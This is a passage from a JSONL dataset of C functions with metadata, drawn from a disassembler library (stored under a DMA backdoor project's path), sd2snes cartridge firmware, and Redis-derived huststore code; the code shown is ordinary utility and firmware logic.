UD_R_BX; op->index = UD_R_DI; break;\n            case 2: op->base = UD_R_BP; op->index = UD_R_SI; break;\n            case 3: op->base = UD_R_BP; op->index = UD_R_DI; break;\n            case 4: op->base = UD_R_SI; break;\n            case 5: op->base = UD_R_DI; break;\n            case 6: op->base = UD_R_BP; break;\n            case 7: op->base = UD_R_BX; break;\n        }\n\n        if (mod == 0 && rm == 6) {\n            op->offset= 16;\n            op->base = UD_NONE;\n        }\n        else if (mod == 1)\n            op->offset = 8;\n        else if (mod == 2) \n            op->offset = 16;\n    }\n  }  \n\n  /* extract offset, if any */\n  switch(op->offset) {\n    case 8 : op->lval.ubyte  = inp_uint8(u);  break;\n    case 16: op->lval.uword  = inp_uint16(u);  break;\n    case 32: op->lval.udword = inp_uint32(u); break;\n    case 64: op->lval.uqword = inp_uint64(u); break;\n    default: break;\n  }\n\n  /* resolve register encoded in reg field */\n  if (opreg) {\n    opreg->type = UD_OP_REG;\n    opreg->size = resolve_operand_size(u, reg_size);\n    if (reg_type == T_GPR) \n        opreg->base = decode_gpr(u, opreg->size, reg);\n    else opreg->base = resolve_reg(u, reg_type, reg);\n  }\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* Looks up mnemonic code in the mnemonic string table\n * Returns NULL if the mnemonic code is invalid\n */\n", "func_signal": "const char * ud_lookup_mnemonic( enum ud_mnemonic_code c )", "code": "{\n    if ( c < UD_Id3vil )\n        return ud_mnemonics_str[ c ];\n    return NULL;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/mnem.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * resolve_gpr32 () - 32bit General Purpose Register-Selection. \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static enum ud_type \nresolve_gpr32(struct ud* u, enum ud_operand_code gpr_op)", "code": "{\n  gpr_op = gpr_op - OP_eAX;\n\n  if (u->opr_mode == 16) \n    return gpr_op + UD_R_AX;\n\n  return gpr_op +  UD_R_EAX;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "// PRINTF_LONG_SUPPORT\n", "func_signal": "static void ui2a(unsigned int num, struct param *p)", "code": "{\n    int n = 0;\n    unsigned int d = 1;\n    char *buff = p->buff;\n\n    while (num / d >= p->base)\n    {\n        d *= p->base;\n    }\n\n    while (d != 0) \n    {\n        int digit = num / d;\n\n        num %= d;\n        d /= p->base;\n        \n        if (n || digit > 0 || d == 0) \n        {\n            *buff++ = (char)(digit + (digit < 10 ? '0' : (p->upper_case ? 'A' : 'a') - 10));\n            ++n;\n        }\n    }\n\n    *buff = 0;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorSimple/src/printf.c", "commit_date": "2017-10-09 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * resolve_gpr64() - 64bit General Purpose Register-Selection. \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static enum ud_type \nresolve_gpr64(struct ud* u, enum ud_operand_code gpr_op)", "code": "{\n  if (gpr_op >= OP_rAXr8 && gpr_op <= OP_rDIr15)\n    gpr_op = (gpr_op - OP_rAXr8) | (REX_B(u->pfx_rex) << 3);          \n  else  gpr_op = (gpr_op - OP_rAX);\n\n  if (u->opr_mode == 16)\n    return gpr_op + UD_R_AX;\n  if (u->dis_mode == 32 || \n    (u->opr_mode == 32 && ! (REX_W(u->pfx_rex) || u->default64))) {\n    return gpr_op + UD_R_EAX;\n  }\n\n  return gpr_op + UD_R_RAX;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_o() - Decodes offset\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ndecode_o(struct ud* u, uint8_t s, struct ud_operand *op)", "code": "{\n  switch (u->adr_mode) {\n    case 64:\n        op->offset = 64; \n        op->lval.uqword = inp_uint64(u); \n        break;\n    case 32:\n        op->offset = 32; \n        op->lval.udword = inp_uint32(u); \n        break;\n    case 16:\n        op->offset = 16; \n        op->lval.uword  = inp_uint16(u); \n        break;\n    default:\n        return;\n  }\n  op->type = UD_OP_MEM;\n  op->size = resolve_operand_size(u, s);\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* =============================================================================\n * ud_disassemble() - disassembles one instruction and returns the number of \n * bytes disassembled. A zero means end of disassembly.\n * =============================================================================\n */\n", "func_signal": "extern unsigned int __stdcall\nud_disassemble(struct ud* u)", "code": "{\n  if (ud_input_end(u))\n\treturn 0;\n\n \n  u->insn_buffer[0] = u->insn_hexcode[0] = 0;\n\n \n  if (ud_decode(u) == 0)\n\treturn 0;\n  if (u->translator)\n\tu->translator(u);\n  return ud_insn_len(u);\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/udis86.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "// PRINTF_LONG_SUPPORT\n", "func_signal": "static void ui2a(unsigned int num, struct param *p)", "code": "{\n    int n = 0;\n    unsigned int d = 1;\n    char *buff = p->buff;\n\n    while (num / d >= p->base)\n    {\n        d *= p->base;\n    }\n\n    while (d != 0) \n    {\n        int digit = num / d;\n\n        num %= d;\n        d /= p->base;\n        \n        if (n || digit > 0 || d == 0) \n        {\n            *buff++ = (char)(digit + (digit < 10 ? '0' : (p->upper_case ? 'A' : 'a') - 10));\n            ++n;\n        }\n    }\n\n    *buff = 0;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/src/printf.c", "commit_date": "2017-10-09 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* get truncated string from database */\n", "func_signal": "void sort_getstring_for_dirent(char *ptr, uint32_t addr)", "code": "{\n  uint8_t leaf_offset;\n  if(addr & 0x80000000) {\n    /* is directory link, name offset 4 */\n    leaf_offset = sram_readbyte(addr + 4 + SRAM_MENU_ADDR);\n    sram_readblock(ptr, addr + 5 + leaf_offset + SRAM_MENU_ADDR, 20);\n  } else {\n    /* is file link, name offset 6 */\n    leaf_offset = sram_readbyte(addr + 6 + SRAM_MENU_ADDR);\n    sram_readblock(ptr, addr + 7 + leaf_offset + SRAM_MENU_ADDR, 20);\n  }\n  ptr[20]=0;\n}", "path": "sd2snes/src/tests/sort.c", "commit_date": "2011-12-19 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* save cheats to YAML file from ROM/menu */\n", "func_signal": "void cheat_yaml_save(uint8_t *romfilename)", "code": "{\n  cheat_record_t cheat;\n  char line[256] = CHEAT_BASEDIR;\n  int numcheats = sram_readshort(SRAM_CHEAT_ADDR);\n\n  append_file_basename(line, (char*)romfilename, \".yml\", sizeof(line));\n  printf(\"Cheat YAML file: %s\\n\", line);\n\n  file_open((uint8_t*)line, FA_WRITE | FA_CREATE_ALWAYS);\n  f_puts(\"---\\n# Generated by sd2snes\\n\", &file_handle);\n  for(int cheat_idx = 0; cheat_idx < numcheats; cheat_idx++) {\n    cheat_save_from_menu(cheat_idx, &cheat);\n    f_printf(&file_handle, \"- Name: \\\"%s\\\"\\n\", cheat.description);\n    f_printf(&file_handle, \"  Enabled: %s\\n\", cheat.flags & CHEAT_FLAG_ENABLE ? \"true\" : \"false\");\n    f_printf(&file_handle, \"  Code:\\n\");\n    for(int i = 0; i < cheat.numpatches; i++) {\n      uint32_t gg_code = cheat_raw2gg(cheat.patches[i].code);\n      f_printf(&file_handle, \"  - \\\"%08lX\\\"    \", cheat.patches[i].code);\n      if(cheat_is_wram_cheat(cheat.patches[i].code)) {\n        f_printf(&file_handle, \"# GG code: N/A (WRAM cheat)\\n\");\n      } else {\n        f_printf(&file_handle, \"# GG code: %04lX-%04lX\\n\", gg_code >> 16, gg_code & 0xffff);\n      }\n    }\n  }\n  file_close();\n}", "path": "sd2snes/src/cheat.c", "commit_date": "2020-06-27 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* read cheats from YAML file to ROM for menu usage */\n", "func_signal": "void cheat_yaml_load(uint8_t* romfilename)", "code": "{\n  yaml_token_t token;\n  char line[256] = CHEAT_BASEDIR;\n  cheat_record_t cheat;\n\n  append_file_basename(line, (char*)romfilename, \".yml\", sizeof(line));\n  check_or_create_folder(CHEAT_BASEDIR);\n  printf(\"Cheat YAML file: %s\\n\", line);\n  yaml_file_open(line, FA_READ);\n  if(file_res) {\n    printf(\"no cheat list YML found\\n\");\n  }\n  /* read cheat entries */\n  int cheat_idx = 0;\n  while(yaml_next_item()) {\n    int i=0;\n    if(yaml_get_itemvalue(\"Name\", &token)) {\n      strncpy(cheat.description, token.stringvalue, 254);\n      cheat.description[253] = 0;\n    }\n    printf(\"%s\\n\", token.stringvalue);\n    yaml_get_itemvalue(\"Enabled\", &token);\n    cheat.flags = (token.boolvalue ? 0x80 : 0x00);\n    printf(\"  enabled: %d\\n\", token.boolvalue);\n    yaml_get_itemvalue(\"Code\", &token);\n    if(token.type == YAML_LIST_START) {\n      for(i=0; i < CHEAT_NUM_CODES_PER_CHEAT; i++) {\n        if(yaml_get_next(&token) == EOF) break;\n        if(token.type == YAML_LIST_END) break;\n        cheat.patches[i].code = cheat_str2bin(token.stringvalue);\n      }\n      cheat.numpatches = i;\n    } else if (token.type != YAML_NONE) {\n      cheat.patches[0].code = cheat_str2bin(token.stringvalue);\n      cheat.numpatches = 1;\n    } else {\n      /* empty list */\n      cheat.numpatches = 0;\n    }\n    printf(\"  num codes: %d\\n\", cheat.numpatches);\n    for(i=0; i<cheat.numpatches; i++) {\n      printf(\"  - %08lX\\n\", cheat.patches[i].code);\n    }\n    /* a single cheat + codes have been read, put in RAM */\n    cheat_load_to_menu(cheat_idx, &cheat);\n    cheat_idx++;\n  }\n  sram_writeshort((uint16_t)cheat_idx, SRAM_NUM_CHEATS);\n  yaml_file_close();\n  file_res = 0; /* soft fail, suppress LED blink */\n  printf(\"Total number of cheats: %d\\n\", cheat_idx);\n}", "path": "sd2snes/src/cheat.c", "commit_date": "2020-06-27 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/**\n * Update the crc value with new data.\n *\n * \\param crc      The current crc value.\n * \\param data     Pointer to a buffer of \\a data_len bytes.\n * \\param data_len Number of bytes in the \\a data buffer.\n * \\return         The updated crc value.\n *****************************************************************************/\n", "func_signal": "uint32_t crc32_update(uint32_t crc, const unsigned char data)", "code": "{\n  unsigned int tbl_idx;\n\n  tbl_idx = (crc ^ data) & 0xff;\n  crc = (crc32_table[tbl_idx] ^ (crc >> 8)) & 0xffffffff;\n\n  return crc & 0xffffffff;\n}", "path": "sd2snes/src/tests/crc32.c", "commit_date": "2011-12-19 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* check if SRAM content has changed and save\n * immediate: 0 = do not check again before one second has expired\n *            1 = check immediately\n */\n", "func_signal": "void msu_savecheck(int immediate)", "code": "{\n  uint32_t currentcrc;\n  if(immediate || (getticks() > msu_last_sram_check + 100)) {\n    currentcrc = calc_sram_crc(SRAM_SAVE_ADDR + romprops.srambase, romprops.sramsize_bytes, 0);\n    if(msu_last_crc != currentcrc) {\n      writeled(1);\n      save_srm(file_lfn, romprops.ramsize_bytes, SRAM_SAVE_ADDR);\n      writeled(0);\n      msu_last_crc = currentcrc;\n    }\n    msu_last_sram_check = getticks();\n  }\n}", "path": "sd2snes/src/msu1.c", "commit_date": "2020-10-10 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* Required for gcc compatibility */\n", "func_signal": "int puts(const char *str)", "code": "{\n  uart_puts(str);\n  uart_putc('\\n');\n  return 0;\n}", "path": "sd2snes/src/printf.c", "commit_date": "2010-09-22 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* prepare GPIOs for pair mode + set initial modes */\n", "func_signal": "void cic_pair(int init_vmode, int init_d4)", "code": "{\n  cic_videomode(init_vmode);\n  cic_d4(init_d4);\n\n  BITBAND(SNES_CIC_D0_REG->FIODIR, SNES_CIC_D0_BIT) = 1;\n  BITBAND(SNES_CIC_D1_REG->FIODIR, SNES_CIC_D1_BIT) = 1;\n}", "path": "sd2snes/src/cic.c", "commit_date": "2018-12-08 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "// send a block\n", "func_signal": "void usbint_send_block(int blockSize)", "code": "{\n    // FIXME: don't need to double buffer anymore if using interrupt\n    while(CDC_block_send((unsigned char*)send_buffer[send_buffer_index], blockSize) == -1) { usbint_check_connect(); }\n    send_buffer_index = (send_buffer_index + 1) & 0x1;\n}", "path": "sd2snes/src/usbinterface.c", "commit_date": "2020-09-30 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/*\n   required units:\n   * SSP0 (FPGA interface) [enabled via spi_init]\n   * UART3 (debug console) [enabled via uart_init]\n   * TIM3 (FPGA clock)\n   * RTC\n   * GPIO\n   * GPDMA [enabled via spi_init]\n   * USB [enabled via usb_init]\n   * PWM1\n*/\n", "func_signal": "void power_init()", "code": "{\n  LPC_SC->PCONP = BV(PCSSP0)\n                | BV(PCTIM3)\n                | BV(PCRTC)\n                | BV(PCGPIO)\n                | BV(PCPWM1)\n//                 | BV(PCUSB)\n  ;\n}", "path": "sd2snes/src/bootldr/power.c", "commit_date": "2011-02-17 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* compare strings pointed to by elements of pointer table */\n", "func_signal": "int sort_cmp_idx(uint32_t base, unsigned int index1, unsigned int index2)", "code": "{\n  uint32_t elem1, elem2;\n  elem1 = sort_get_elem(base, index1);\n  elem2 = sort_get_elem(base, index2);\n  return sort_cmp_elem((void*)&elem1, (void*)&elem2);\n}", "path": "sd2snes/src/tests/sort.c", "commit_date": "2011-12-19 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* returns true if no MSU feature is in use at the moment so the SD card\n   may be used to save the game */\n", "func_signal": "int is_msu_free_to_save()", "code": "{\n  return (msu_audio_usage == MSU_IDLE)\n    && (msu_data_usage == MSU_IDLE);\n}", "path": "sd2snes/src/msu1.c", "commit_date": "2020-10-10 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* printf */\n", "func_signal": "static void outchar(char x)", "code": "{\n  if (maxlen) {\n    maxlen--;\n    outfunc(x);\n    outlength++;\n  }\n}", "path": "sd2snes/src/printf.c", "commit_date": "2010-09-22 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "// collect a flit\n", "func_signal": "void usbint_recv_flit(const unsigned char *in, int length)", "code": "{\n    //if (!length) return;\n    \n    // read in new flit \n    unsigned bytesRead = min(length, (!cmdDat ? USB_BLOCK_SIZE : server_info.block_size) - recv_buffer_offset);\n    memcpy(recv_buffer + recv_buffer_offset, in, bytesRead);\n    unsigned old_recv_buffer_offset = recv_buffer_offset;\n    recv_buffer_offset += bytesRead;\n\n    //PRINT_MSG(\"[ flt]\");\n    //printf(\" l: %d \", length);\n    //PRINT_END();\n\n    if (!cmdDat) {\n        // FIXME: make this more general.  Commands should be under 64B \n        // check the command type for 64B vs 512B\n        if (recv_buffer_offset < 64) {\n            // make sure we don't accidentally accept a command that isn't ready.\n            server_info.cmd_size = USB_BLOCK_SIZE;\n        }\n        else if (old_recv_buffer_offset < 64 && 64 <= recv_buffer_offset) {\n            server_info.cmd_size = (recv_buffer[4] == USBINT_SERVER_OPCODE_VGET || recv_buffer[4] == USBINT_SERVER_OPCODE_VPUT) ? 64 : 512;\n        }\n    }\n    \n    unsigned size = (!cmdDat ? server_info.cmd_size : server_info.block_size);\n    if (recv_buffer_offset >= size) {\n        unsigned cmdDat_old = cmdDat;\n        if (!cmdDat) {\n            server_info.block_size = (recv_buffer[6] & USBINT_SERVER_FLAGS_64BDATA) ? 64 : USB_BLOCK_SIZE;\n            // copy the command to its buffer\n            memcpy((unsigned char*)cmd_buffer, recv_buffer, size);\n            //__DMB2();\n        }\n        //printf(\" cmdDat: %d cmd_size: %d block_size: %d\", cmdDat, (int)server_info.cmd_size, (int)server_info.block_size);\n        usbint_recv_block();\n\n        // There's a race with NORESP where the data can show up before we have setup the handler.  If it does this then\n        // the old code would skip receiving the flit and it would hang because the interrupt handler wouldn't be called again\n        // To avoid that we disable the handler here and let the menu loop re-enable it when we have it locked.\n        if (!cmdDat_old && cmdDat) NVIC_DisableIRQ(USB_IRQn);\n        \n        // FIXME: implement proper circular queue.\n        \n        // shift extra bytes down\n        memmove((unsigned char*)recv_buffer, recv_buffer + size, recv_buffer_offset - size);\n        recv_buffer_offset -= size;\n        \n        // copy any remaining input bytes\n        memcpy((unsigned char*)recv_buffer + recv_buffer_offset, in + bytesRead, length - bytesRead);\n        recv_buffer_offset += length - bytesRead;\n    }\n}", "path": "sd2snes/src/usbinterface.c", "commit_date": "2020-09-30 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/**\n * Update the crc value with new data.\n *\n * \\param crc      The current crc value.\n * \\param data     Pointer to a buffer of \\a data_len bytes.\n * \\param data_len Number of bytes in the \\a data buffer.\n * \\return         The updated crc value.\n *****************************************************************************/\n", "func_signal": "uint32_t crc32_update(uint32_t crc, const unsigned char data)", "code": "{\n  unsigned int tbl_idx;\n\n  tbl_idx = (crc ^ data) & 0xff;\n  crc = (crc32_table[tbl_idx] ^ (crc >> 8)) & 0xffffffff;\n\n  return crc & 0xffffffff;\n}", "path": "sd2snes/src/crc32.c", "commit_date": "2010-10-04 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* Required for gcc compatibility */\n", "func_signal": "int puts(const char *str)", "code": "{\n  uart_puts(str);\n  uart_putc('\\n');\n  return 0;\n}", "path": "sd2snes/src/tests/printf.c", "commit_date": "2011-12-19 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* printf */\n", "func_signal": "static void outchar(char x)", "code": "{\n  if (maxlen) {\n    maxlen--;\n    outfunc(x);\n    outlength++;\n  }\n}", "path": "sd2snes/src/tests/printf.c", "commit_date": "2011-12-19 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/**\n * l_opendir - open a directory by cluster number\n * @fs     : Pointer to the FATFS structure of the target file system\n * @dj     : Pointer to the DIR structure to be filled\n * @cluster: Number of the start cluster of the directory (0=root)\n *\n * This functions works like f_opendir, but instead of a path the directory\n * to be opened is specified by the FATFS structure and the starting cluster\n * number. Use 0 for the cluster to open the root directory.\n * Always returns FR_OK.\n */\n", "func_signal": "FRESULT l_opendir(FATFS* fs, DWORD cluster, DIR *dj)", "code": "{\n  dj->fs = fs;\n  //dj->id = fs->id;\n\n  if (cluster == 0) {\n    /* Open the root directory */\n    cluster = fs->dirbase;\n    if (fs->fs_type == FS_FAT32) {\n      dj->clust = dj->sclust = cluster;\n      dj->sect  = clust2sect(fs, cluster);\n    } else {\n      dj->clust = dj->sclust = 0;\n      dj->sect  = cluster;\n    }\n    dj->index = 0;\n  } else {\n    /* Open a non-root directory */\n    dj->clust = dj->sclust = cluster;\n    dj->sect  = clust2sect(fs, cluster);\n#if _USE_CHDIR != 0 || _USE_CURR_DIR != 0\n    dj->index = 0;\n#else\n    dj->index = 2;\n#endif\n  }\n  return FR_OK;\n}", "path": "sd2snes/mk1-src/ff.c", "commit_date": "2010-09-06 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* sprintf */\n", "func_signal": "static void outstr(char x)", "code": "{\n  if (maxlen) {\n    maxlen--;\n    *outptr++ = x;\n    outlength++;\n  }\n}", "path": "sd2snes/src/tests/printf.c", "commit_date": "2011-12-19 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/* Polling version only */\n", "func_signal": "unsigned char uart_getc(void)", "code": "{\n  /* wait for character */\n  while (!(BITBAND(UART_REGS->LSR, 0))) ;\n  return UART_REGS->RBR;\n}", "path": "sd2snes/src/tests/uart.c", "commit_date": "2015-11-26 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "// top level state machine\n", "func_signal": "int usbint_handler(void)", "code": "{\n    int ret = 0;\n\n    usbint_check_connect();\n\n    switch(server_state) {\n            case USBINT_SERVER_STATE_HANDLE_CMD: ret = usbint_handler_cmd(); break;\n            // FIXME: are these needed anymore?  PUSHDAT was for non-interrupt operation and EXE uses flags now\n            case USBINT_SERVER_STATE_HANDLE_DATPUSH: ret = usbint_handler_dat(); break;\n                \n            default: break;\n\t}\n\n    return ret;\n}", "path": "sd2snes/src/usbinterface.c", "commit_date": "2020-09-30 00:00:00", "repo_name": "mrehkopf/sd2snes", "stars": 564, "license": "gpl-2.0", "language": "c", "size": 15467}
{"docstring": "/*-----------------------------------------------------------------------------\n * List Commands\n *----------------------------------------------------------------------------*/\n", "func_signal": "int pushGenericCommand ( client *c, int where )", "code": "{\n    int j, waiting = 0, pushed = 0;\n    robj *lobj = lookupKeyWrite (c->db, c->argv[1]);\n\n    if ( lobj && lobj->type != OBJ_LIST )\n    {\n        return C_ERR;\n    }\n\n    for ( j = 2; j < c->argc; j ++ )\n    {\n        c->argv[j] = tryObjectEncoding (c->argv[j]);\n        if ( ! lobj )\n        {\n            lobj = createQuicklistObject ();\n            quicklistSetOptions (lobj->ptr, server.list_max_ziplist_size,\n                                 server.list_compress_depth);\n            dbAdd (c->db, c->argv[1], lobj);\n        }\n        listTypePush (lobj, c->argv[j], where);\n        pushed ++;\n    }\n    addReplyLongLong (c, waiting + ( lobj ? listTypeLength (lobj) : 0 ));\n    return C_OK;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Convert a string into a long long. Returns 1 if the string could be parsed\n * into a (non-overflowing) long long, 0 otherwise. The value will be set to\n * the parsed value when appropriate. */\n", "func_signal": "int string2ll ( const char *s, size_t slen, long long *value )", "code": "{\n    const char *p = s;\n    size_t plen = 0;\n    int negative = 0;\n    unsigned long long v;\n\n    if ( plen == slen )\n        return 0;\n\n    /* Special case: first and only digit is 0. */\n    if ( slen == 1 && p[0] == '0' )\n    {\n        if ( value != NULL ) *value = 0;\n        return 1;\n    }\n\n    if ( p[0] == '-' )\n    {\n        negative = 1;\n        p ++;\n        plen ++;\n\n        /* Abort on only a negative sign. */\n        if ( plen == slen )\n            return 0;\n    }\n\n    /* First digit should be 1-9, otherwise the string should just be 0. */\n    if ( p[0] >= '1' && p[0] <= '9' )\n    {\n        v = p[0] - '0';\n        p ++;\n        plen ++;\n    }\n    else if ( p[0] == '0' && slen == 1 )\n    {\n        *value = 0;\n        return 1;\n    }\n    else\n    {\n        return 0;\n    }\n\n    while ( plen < slen && p[0] >= '0' && p[0] <= '9' )\n    {\n        if ( v > ( ULLONG_MAX / 10 ) ) /* Overflow. */\n            return 0;\n        v *= 10;\n\n        if ( v > ( ULLONG_MAX - ( p[0] - '0' ) ) ) /* Overflow. */\n            return 0;\n        v += p[0] - '0';\n\n        p ++;\n        plen ++;\n    }\n\n    /* Return if not all bytes were used. */\n    if ( plen < slen )\n        return 0;\n\n    if ( negative )\n    {\n        if ( v > ( ( unsigned long long ) ( - ( LLONG_MIN + 1 ) ) + 1 ) ) /* Overflow. */\n            return 0;\n        if ( value != NULL ) *value = - v;\n    }\n    else\n    {\n        if ( v > LLONG_MAX ) /* Overflow. */\n            return 0;\n        if ( value != NULL ) *value = v;\n    }\n    return 1;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Clean up the iterator. */\n", "func_signal": "void listTypeReleaseIterator ( listTypeIterator *li )", "code": "{\n    zfree (li->iter);\n    zfree (li);\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Like digits10() but for signed values. */\n", "func_signal": "uint32_t sdigits10 ( int64_t v )", "code": "{\n    if ( v < 0 )\n    {\n        /* Abs value of LLONG_MIN requires special handling. */\n        uint64_t uv = ( v != LLONG_MIN ) ?\n            ( uint64_t ) - v : ( ( uint64_t ) LLONG_MAX ) + 1;\n        return digits10 (uv) + 1; /* +1 for the minus. */\n    }\n    else\n    {\n        return digits10 (v);\n    }\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Initialize an iterator at the specified index. */\n", "func_signal": "listTypeIterator *listTypeInitIterator ( robj *subject, long index,\n                                         unsigned char direction )", "code": "{\n    listTypeIterator *li = zmalloc (sizeof (listTypeIterator ));\n    li->subject = subject;\n    li->encoding = subject->encoding;\n    li->direction = direction;\n    li->iter = NULL;\n    /* LIST_HEAD means start at TAIL and move *towards* head.\n     * LIST_TAIL means start at HEAD and move *towards tail. */\n    int iter_direction =\n        direction == LIST_HEAD ? AL_START_TAIL : AL_START_HEAD;\n    if ( li->encoding == OBJ_ENCODING_QUICKLIST )\n    {\n        li->iter = quicklistGetIteratorAtIdx (li->subject->ptr,\n                                              iter_direction, index);\n    }\n    return li;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Convert a string into a long. Returns 1 if the string could be parsed into a\n * (non-overflowing) long, 0 otherwise. The value will be set to the parsed\n * value when appropriate. */\n", "func_signal": "int string2l ( const char *s, size_t slen, long *lval )", "code": "{\n    long long llval;\n\n    if ( ! string2ll (s, slen, &llval) )\n        return 0;\n\n    if ( llval < LONG_MIN || llval > LONG_MAX )\n        return 0;\n\n    *lval = ( long ) llval;\n    return 1;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Given the filename, return the absolute path as an SDS string, or NULL\n * if it fails for some reason. Note that \"filename\" may be an absolute path\n * already, this will be detected and handled correctly.\n *\n * The function does not try to normalize everything, but only the obvious\n * case of one or more \"../\" appearning at the start of \"filename\"\n * relative path. */\n", "func_signal": "sds getAbsolutePath ( char *filename )", "code": "{\n    char cwd[1024];\n    sds abspath;\n    sds relpath = sdsnew (filename);\n\n    relpath = sdstrim (relpath, \" \\r\\n\\t\");\n    if ( relpath[0] == '/' ) return relpath; /* Path is already absolute. */\n\n    /* If path is relative, join cwd and relative path. */\n    if ( getcwd (cwd, sizeof (cwd )) == NULL )\n    {\n        sdsfree (relpath);\n        return NULL;\n    }\n    abspath = sdsnew (cwd);\n    if ( sdslen (abspath) && abspath[sdslen (abspath) - 1] != '/' )\n        abspath = sdscat (abspath, \"/\");\n\n    /* At this point we have the current path always ending with \"/\", and\n     * the trimmed relative path. Try to normalize the obvious case of\n     * trailing ../ elements at the start of the path.\n     *\n     * For every \"../\" we find in the filename, we remove it and also remove\n     * the last element of the cwd, unless the current cwd is \"/\". */\n    while ( sdslen (relpath) >= 3 &&\n            relpath[0] == '.' && relpath[1] == '.' && relpath[2] == '/' )\n    {\n        sdsrange (relpath, 